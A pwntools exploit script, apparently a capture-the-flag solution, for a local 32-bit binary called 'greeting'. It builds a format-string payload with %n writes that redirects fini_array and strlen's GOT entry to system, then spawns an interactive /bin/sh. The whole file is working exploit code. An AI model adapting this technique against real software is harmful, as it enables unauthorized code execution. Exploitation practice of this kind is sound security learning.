from pwn import *

target = process('./greeting')
# gdb.attach(target, gdbscript='b *0x08048662')

# initial values
fini_array = 0x08049934
strlen = 0x08049a54

# our values
getnline = 0x8048614
system = 0x08048490

# create the payload
payload = b''
# padding
payload += bytes('xx', 'utf8')
# addresses to overwrite
payload += p32(fini_array)
payload += p32(fini_array + 2)
payload += p32(strlen)
payload += p32(strlen + 2)

# by default it writes 0x24 (comment out the just the line below). 0x9934 = 34288 + 0x24
payload += bytes('%34288x', 'utf8')
payload += bytes('%12$n', 'utf8')

# 0x18490 (target) - 0x8614 (actual) = 65148
payload += bytes('%65148x', 'utf8')
payload += bytes('%14$n', 'utf8')

# For the rest they have the same actual value (0x8490) and we want to go to 0x0804 -> 33652
payload += bytes('%33652x', 'utf8')
payload += bytes('%13$n', 'utf8')
payload += bytes('%15$n', 'utf8')

target.sendline(payload)

target.sendline('/bin/sh')

target.interactive()